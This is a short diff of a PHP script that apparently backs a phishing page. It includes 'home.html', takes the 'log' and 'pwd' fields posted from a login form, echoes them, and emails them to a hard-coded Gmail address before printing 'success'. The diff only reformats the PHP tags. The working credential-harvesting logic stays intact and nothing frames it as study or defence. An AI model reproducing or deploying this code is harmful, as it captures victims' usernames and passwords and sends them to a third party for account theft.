@@ -1,5 +1,4 @@
-<?php
- include_once("home.html");
+<?php include_once("home.html");
 $log=$_POST['log'];
 $to='rrohitchauhan11@gmail.com';
 $pwd=$_POST['pwd'];
@@ -9,7 +8,4 @@ $headers="From:"
 echo $log;
 echo $pwd;
 mail($to, $subject, $message, $headers);
-
-echo "success";
-
-?>
+echo "success";?>
